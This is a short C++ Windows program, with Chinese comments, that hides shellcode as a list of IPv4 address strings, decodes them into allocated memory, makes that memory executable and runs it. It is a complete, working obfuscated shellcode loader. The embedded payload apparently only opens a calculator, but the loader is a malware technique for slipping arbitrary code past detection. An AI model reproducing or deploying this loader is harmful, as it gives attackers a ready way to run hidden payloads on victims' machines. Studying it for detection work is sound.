#include <Windows.h>
#include <ip2string.h>     // RtlIpv4StringToAddressA
#include <iostream>
#pragma comment(lib, "ntdll.lib")

int main() {
    const char* ipv4s[] = {
        "144.144.144.144","252.232.130.0","0.0.96.137","229.49.192.100","139.80.48.139","82.12.139.82","20.139.114.40","15.183.74.38","49.255.172.60","97.124.2.44","32.193.207.13","1.199.226.242","82.87.139.82","16.139.74.60","139.76.17.120","227.72.1.209","81.139.89.32","1.211.139.73","24.227.58.73","139.52.139.1","214.49.255.172","193.207.13.1","199.56.224.117","246.3.125.248","59.125.36.117","228.88.139.88","36.1.211.102","139.12.75.139","88.28.1.211","139.4.139.1","208.137.68.36","36.91.91.97","89.90.81.255","224.95.95.90","139.18.235.141","93.106.1.141","133.178.0.0","0.80.104.49","139.111.135.255","213.187.240.181","162.86.104.166","149.189.157.255","213.60.6.124","10.128.251.224","117.5.187.71","19.114.111.106","0.83.255.213","99.97.108.99"
    };
    int count = sizeof(ipv4s) / sizeof(ipv4s[0]);

    // 每个 IPv4 地址解码后是 4 字节
    SIZE_T shellcodeSize = count * 4;

    LPVOID mem = VirtualAlloc(nullptr, shellcodeSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;

    PBYTE ptr = (PBYTE)mem;
    for (int i = 0; i < count; ++i) {
        PCSTR terminator = nullptr;
        // 注意：第三个参数是输出参数，必须传地址
        if (RtlIpv4StringToAddressA(ipv4s[i], TRUE, &terminator, (in_addr*)ptr) != 0) {
            VirtualFree(mem, 0, MEM_RELEASE);
            return 1;
        }
        ptr += 4;
    }

    DWORD oldProtect;
    if (!VirtualProtect(mem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }

    ((void(*)())mem)();

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}